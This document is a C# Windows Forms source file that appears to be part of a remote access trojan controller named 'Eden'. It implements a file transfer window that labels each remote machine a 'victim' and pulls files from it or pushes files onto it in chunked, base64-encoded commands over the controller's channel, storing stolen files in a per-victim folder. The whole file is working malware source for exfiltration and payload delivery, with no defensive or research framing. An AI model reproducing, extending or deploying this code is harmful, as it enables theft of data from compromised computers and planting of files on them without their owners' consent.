using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileTransfer : Form
    {
        private clsVictim m_victim;
        public string m_szVictimID;

        private string m_szCurrentDir { get; set; }

        private List<string> m_lszFilePath { get; set; }
        private clsTransferFileHandler.enMethod m_transferType { get; set; }

        private Queue<clsTransferFileHandler> m_qTransferFile = new Queue<clsTransferFileHandler>();
        private Dictionary<string, clsTransferFileHandler> m_dicTransferFile = new Dictionary<string, clsTransferFileHandler>();
        private int m_nChunkSize = 1024 * 128;
        private bool m_bPause { get; set; }
        private bool m_bStop { get; set; }

        private int m_nThreadCnt { get; set; }

        private object m_objLock = new object();

        public frmFileTransfer(clsVictim victim, string szCurrentDir, List<string> lszFilePath, clsTransferFileHandler.enMethod transferType)
        {
            InitializeComponent();

            m_victim = victim;
            m_szVictimID = victim.m_szID;

            m_szCurrentDir = szCurrentDir;

            m_lszFilePath = lszFilePath;
            m_transferType = transferType;
        }

        void fnSrvRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (szVictimID != m_victim.m_szID)
                return;

            try
            {
                if (lsMsg[0] == "file")
                {
                    if (lsMsg[1] == "uf")
                    {
                        if (lsMsg[2] == "write")
                        {
                            int nCode = int.Parse(lsMsg[3]);
                            string szRemotePath = lsMsg[4];

                            if (nCode == 1)
                            {
                                var handler = m_dicTransferFile[szRemotePath];
                                fnUpdateProgress(handler);

                                while (m_bPause)
                                {
                                    Thread.Sleep(1000);
                                }

                                if (m_bStop)
                                {
                                    fnWriteLog("Task is terminated.");
                                    return;
                                }

                                fnSendNextChunk(handler);
                            }
                            else
                            {
                                fnWriteLog($"Error[{szRemotePath}]: {lsMsg[5]}");

                                m_dicTransferFile[szRemotePath].Dispose();
                                m_dicTransferFile.Remove(szRemotePath);
                            }
                        }
                    }
                    else if (lsMsg[1] == "df")
                    {
                        if (lsMsg[2] == "read")
                        {
                            int nCode = int.Parse(lsMsg[3]);
                            string szRemotePath = lsMsg[4];

                            if (nCode == 1)
                            {
                                byte[] abChunk = Convert.FromBase64String(lsMsg[5]);
                                long nFileSize = long.Parse(lsMsg[6]);
                                
                                var handler = m_dicTransferFile[szRemotePath];
                                handler.m_nFileSize = handler.m_nFileSize == -1 ? nFileSize : handler.m_nFileSize;
                                handler.fnWriteChunk(abChunk);

                                fnUpdateProgress(handler);

                                while (m_bPause)
                                {
                                    Thread.Sleep(1000);
                                }

                                if (m_bStop)
                                {
                                    fnWriteLog("Task is terminated.");
                                    return;
                                }

                                fnGetNextChunk(handler);
                            }
                            else
                            {
                                fnWriteLog($"Error[{szRemotePath}]: {lsMsg[5]}");

                                m_dicTransferFile[szRemotePath].Dispose();
                                m_dicTransferFile.Remove(szRemotePath);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        void fnWriteLog(string szMsg)
        {
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
            richTextBox1.AppendText(Environment.NewLine);
        }

        void fnUpdateProgress(clsTransferFileHandler handler)
        {
            Invoke(new Action(() =>
            {
                if (handler.m_nFileSize == -1)
                    return;

                ListViewItem? item = listView1.FindItemWithText(handler.szRemoteFile, true, 0);
                if (item == null)
                    return;

                long nDone = handler.m_enMethod == clsTransferFileHandler.enMethod.Upload ? handler.m_nRead : handler.m_nWritten;
                double dProgress = (double)((double)nDone / (double)handler.m_nFileSize) * 100;

                item.SubItems[2].Text = dProgress.ToString("0.00") + " %";

                if (nDone == handler.m_nFileSize)
                {
                    item.SubItems[2].Text = "OK";
                    handler.m_bFinished = true;
                    m_dicTransferFile.Remove(handler.szRemoteFile);

                    toolStripProgressBar1.Increment(1);

                    fnWriteLog("Completed: " + handler.m_szDstFilePath);

                    if (toolStripProgressBar1.Value == m_lszFilePath.Count) //Maximum
                        fnWriteLog("All tasks are finished.");
                }
            }));
        }

        void fnSendNextChunk(clsTransferFileHandler handler)
        {
            if (handler.m_enMethod != clsTransferFileHandler.enMethod.Upload)
                throw new Exception("This function is for uploading.");
            
            string szRemoteFile = handler.szRemoteFile;

            long nRead = handler.m_nRead;
            byte[] abChunk = handler.fnReadNextChunk();
            if (handler.m_bFinished)
            {
                //MessageBox.Show("OK");
                return;
            }

            m_victim.fnSendCommand(new string[]
            {
                "File",
                "uf",
                "write",
                m_nChunkSize.ToString(),
                handler.m_nRead.ToString(),
                szRemoteFile,
                Convert.ToBase64String(abChunk),
            });
        }

        void fnGetNextChunk(clsTransferFileHandler handler)
        {
            if (handler.m_enMethod != clsTransferFileHandler.enMethod.Download)
                throw new Exception("This function is for downloading.");

            if (handler.m_bFinished)
                return;



            m_victim.fnSendCommand(new string[]
            {
                "File",
                "df",
                "read",
                m_nChunkSize.ToString(),
                handler.m_nWritten.ToString(),
                handler.szRemoteFile,
                string.Empty,
            });
        }

        void fnStart()
        {
            if (m_dicTransferFile.Keys.Count == 0)
                return;

            var handler = m_dicTransferFile.Values.First();
            switch (handler.m_enMethod)
            {
                case clsTransferFileHandler.enMethod.Upload:
                    fnSendNextChunk(handler);
                    break;
                case clsTransferFileHandler.enMethod.Download:
                    fnGetNextChunk(handler);
                    break;
            }
        }

        void fnSetup()
        {
            //Events
            m_victim.m_clnt.ServerMessageReceived += fnSrvRecv;

            toolStripProgressBar1.Maximum = m_lszFilePath.Count;
            toolStripProgressBar1.Value = 0;

            //ListView init
            foreach (string szFilePath in m_lszFilePath)
            {
                string szRemoteFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(szFilePath)).Replace("\\", "/");
                ListViewItem item = new ListViewItem(szRemoteFilePath);
                item.SubItems.Add(szFilePath);
                item.SubItems.Add("?");

                listView1.Items.Add(item);

                string szSaveDirPath = Path.Combine(new string[] { m_victim.m_szDirectory, "File" });
                if (!Directory.Exists(szSaveDirPath))
                    Directory.CreateDirectory(szSaveDirPath);

                string szLocalFilePath = string.Empty;
                if (m_transferType == clsTransferFileHandler.enMethod.Upload)
                    szLocalFilePath = szFilePath;
                else
                    szLocalFilePath = Path.Combine(szSaveDirPath, Path.GetFileName(szFilePath));

                string szSrcFilePath = m_transferType == clsTransferFileHandler.enMethod.Upload ? szLocalFilePath : szRemoteFilePath;
                string szDstFilePath = m_transferType == clsTransferFileHandler.enMethod.Upload ? szRemoteFilePath : szLocalFilePath;

                clsTransferFileHandler handler = new clsTransferFileHandler(
                    szSrcFilePath,
                    szDstFilePath,
                    m_transferType,
                    m_nChunkSize
                );

                m_dicTransferFile.Add(szRemoteFilePath, handler);
            }

            fnStart();
        }

        private void frmFileTransfer_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Folder
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string szDir = Path.Combine(m_victim.m_szDirectory, "File");

            if (Directory.Exists(szDir))
                Process.Start("explorer.exe", szDir);
            else
                MessageBox.Show("Directory not found: " + szDir, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void frmFileTransfer_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnSrvRecv;   
        }

        //Pause
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            m_bPause = true;
            fnWriteLog("Pause...");
        }
        //Resume
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            m_bPause = false;
            fnWriteLog("Resume.");
        }
        //Stop
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            m_bStop = true;
        }
    }
}
